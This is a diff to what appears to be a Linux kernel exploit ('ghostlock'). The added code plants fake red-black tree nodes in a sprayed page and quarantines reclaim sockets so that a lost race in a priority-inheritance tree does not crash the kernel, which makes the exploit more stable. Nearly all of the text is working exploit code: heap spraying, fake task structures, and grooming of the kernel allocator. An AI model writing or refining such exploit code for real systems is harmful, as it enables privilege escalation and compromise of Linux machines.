@@ -432,6 +432,18 @@ namespace ghostlock::support {
             put64(p, kernel::LOCK_OFF + 0x10, (session::g_exploit_session.heap.current.fake_w0));
             put64(p, kernel::LOCK_OFF + 0x18, (session::g_exploit_session.heap.current.fake_task) | 1);
 
+            /* A lost race can leave the kernel walking one of our page-derived
+             * pointers as an rb_node. rb_insert_color() descends while
+             * rb_is_black(parent) = *(parent) & 1 is clear and then reads
+             * *(*(parent)) as the grandparent, so every word the kernel can
+             * mistake for a node holds an odd value: 1 is a self-consistent
+             * black node (parent 0, no children) that ends the walk on the
+             * first read instead of dereferencing a zero grandparent. */
+            put64(p, 0x00, 1); /* payload base: page-aligned node candidate */
+            put64(p, kernel::RELINK_NODE_OFF + 0x00, 1); /* tree_pc target */
+            put64(p, kernel::RELINK_NODE_OFF + 0x08, 0);
+            put64(p, kernel::RELINK_NODE_OFF + 0x10, 0);
+
             if (compact) {
                 /* Words ride the erase relink: pc = value, rb_left = dest,
                  * rb_right = 0 or the one-child arm also clobbers *(value) with
@@ -543,6 +555,16 @@ namespace ghostlock::support {
         /* Release every userspace reference from the preceding write before the
          * context arrays are replaced. Keeping the final post-spray memfd pinned
          * leaked one mm_struct per stage and progressively poisoned later sprays. */
+        /* Drop the page before the previous one, then quarantine rather than
+         * close the previous one. A lost race can leave one of that page's
+         * addresses linked into a PI tree, and closing the reclaim sockets hands
+         * the page back to the allocator: the stale node then reads back as zero,
+         * which is exactly the red node with no grandparent that turns the next
+         * rb_insert_color walk into a fault or an endless loop. Holding one page
+         * keeps the planted black node readable while the bound on pinned memory
+         * stays the same. */
+        release_quarantined_reclaim_sockets();
+        (void) quarantine_reclaim_sockets();
         close_reclaim_sockets();
         cleanup_page_prepare_state();
         mm_objs_per_slab = kernel::ORDER3_SIZE /
